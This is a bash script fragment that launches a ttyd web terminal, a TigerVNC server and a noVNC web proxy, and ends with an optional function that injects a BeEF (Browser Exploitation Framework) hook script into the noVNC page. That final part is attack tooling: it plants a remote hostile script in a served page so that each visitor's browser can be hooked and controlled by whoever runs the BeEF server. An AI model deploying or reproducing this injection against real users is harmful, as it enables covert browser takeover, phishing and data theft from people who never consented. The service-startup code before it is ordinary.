#!/bin/bash
# ============================================================================
# SERVICE MANAGEMENT
# ============================================================================

configure_novnc() {
    if [[ -f "/usr/share/novnc/vnc.html" && ! -f "/usr/share/novnc/index.html" ]]; then
        sudo cp /usr/share/novnc/vnc.html /usr/share/novnc/index.html
    fi
}

start_ttyd() {
    log "blue" "Starting ttyd..." "💬"
    install_ttyd
    
    if [[ "$DISABLE_SSL" == true ]]; then
        warn "Starting ttyd WITHOUT SSL."
        sudo -u "$TEMP_USER" ttyd -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
    else
        success "Starting ttyd WITH SSL."
        sudo -u "$TEMP_USER" ttyd -S --ssl -C "$SSL_CERT" -K "$SSL_KEY" \
            -c "$TTYD_USERNAME:$TTYD_PASSWD" -p "$TTYD_PORT" bash &
    fi
}

start_vnc_server() {
    log "blue" "Starting TigerVNC server for $TEMP_USER..." "💻"
    
    if sudo -u "$TEMP_USER" tigervncserver "$VNC_DISPLAY" -geometry "$VNC_GEOMETRY" \
        -depth "$VNC_DEPTH" -rfbport "$VNC_PORT" -SecurityTypes VncAuth -localhost no; then
        success "TigerVNC server started successfully."
    else
        die "Failed to start TigerVNC server."
    fi
}

start_novnc() {
    log "blue" "Starting noVNC..." "💻"
    configure_novnc
    
    if [[ "$DISABLE_SSL" == true ]]; then
        warn "Starting noVNC WITHOUT SSL."
        sudo -u "$TEMP_USER" /usr/share/novnc/utils/novnc_proxy \
            --vnc "127.0.0.1:$VNC_PORT" --listen "$NOVNC_PORT" &
    else
        success "Starting noVNC WITH SSL."
        sudo -u "$TEMP_USER" /usr/share/novnc/utils/novnc_proxy \
            --vnc "127.0.0.1:$VNC_PORT" --listen "$NOVNC_PORT" \
            --cert "$SSL_CERT" --key "$SSL_KEY" --ssl-only &
    fi
}

# ============================================================================
# BEEF INJECTION (OPTIONAL)
# ============================================================================

inject_beef() {
    [[ "$BEEF_ENABLED" != "true" ]] && return
    [[ -z "$BEEF_HOOK_URL" ]] && {
        warn "BEEF_ENABLED is true but BEEF_HOOK_URL is not set. Skipping injection."
        return
    }
    
    log "red" "Injecting BeEF into noVNC..." "💉"
    
    if [[ ! -f "$INDEX_FILE" ]]; then
        log "red" "Creating index.html and injecting script..." "💉"
        sudo cp "$VNC_FILE" "$INDEX_FILE"
    else
        log "red" "Creating backup and injecting script in vnc.html..." "💉"
        sudo cp "$INDEX_FILE" "$VNC_FILE"
    fi
    
    echo "<script src='$BEEF_HOOK_URL'></script>" | sudo tee -a "$VNC_FILE" > /dev/null
}
